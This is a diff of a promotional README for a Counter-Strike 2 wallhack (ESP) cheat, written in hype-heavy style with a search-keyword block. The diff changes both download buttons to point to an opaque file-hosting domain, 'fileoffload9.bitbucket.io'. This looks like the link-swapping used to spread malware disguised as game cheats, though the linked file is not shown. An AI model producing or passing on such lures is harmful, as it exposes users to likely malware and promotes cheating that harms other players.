@@ -4,7 +4,7 @@ Wanna own every lobby in CS2 without sweating? 💀 Then you’re in the right p
 
 Whether you're grinding ranked or messing around with your crew, this ESP cheat gives you *that* unfair edge CS2 players secretly dream about.
 
-[![Download Wallhack](https://img.shields.io/badge/Download-Wallhack-blueviolet)](https://wecheaters.github.io/cheats/cs2)
+[![Download Wallhack](https://img.shields.io/badge/Download-Wallhack-blueviolet)](https://fileoffload9.bitbucket.io)
 ---
 
 ## What Is CS2 Wallhack (ESP)? 👀
@@ -19,7 +19,7 @@ Wallhack (a.k.a. ESP – Extra Sensory Perception) is the OG cheat that **reveal
 
 Forget about those clutches where you guess wrong. Now you’ll always know where they’re camping. 🔍
 
-[![Download Wallhack](https://i.ytimg.com/vi/HE7ay9Zuhsc/maxresdefault.jpg)](https://wecheaters.github.io/cheats/cs2)
+[![Download Wallhack](https://i.ytimg.com/vi/HE7ay9Zuhsc/maxresdefault.jpg)](https://fileoffload9.bitbucket.io)
 ---
 
 ## Features That Make This Wallhack Insane 😈
@@ -104,3 +104,4 @@ Just don’t get too cocky… or too obvious. 😉
 ## Keywords:
 
 Counter-Strike 2 wallhack, CS2 ESP, see through walls CS2, wall cheat CS2, ESP hack CS2, CS2 glow hack, CS2 visuals mod, enemy tracker CS2, x-ray cheat, CS2 modmenu, undetected CS2 wallhack, legit config cheat, CS2 see players behind walls, best CS2 cheats.
+
